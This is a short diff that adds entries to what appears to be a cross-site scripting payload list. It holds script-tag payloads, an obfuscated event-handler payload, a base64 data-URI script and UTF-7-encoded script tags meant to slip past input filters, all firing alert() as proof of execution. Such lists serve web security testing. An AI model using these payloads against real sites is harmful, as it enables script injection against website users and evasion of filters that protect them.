@@ -2,6 +2,10 @@
 <detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//
 <script>alert('test');</script>
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
++ADw-script+AD4- alert()+ADw-/script+AD4-
+<script>alert('xss')</script>
++ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-
++ADw-script+AD4-alert(+ACc-utf-7!+ACc-)+ADw-+AC8-script+AD4-
 alert(document.domain)
 (alert)(document.domain)
 al\u0065rt(document.domain)
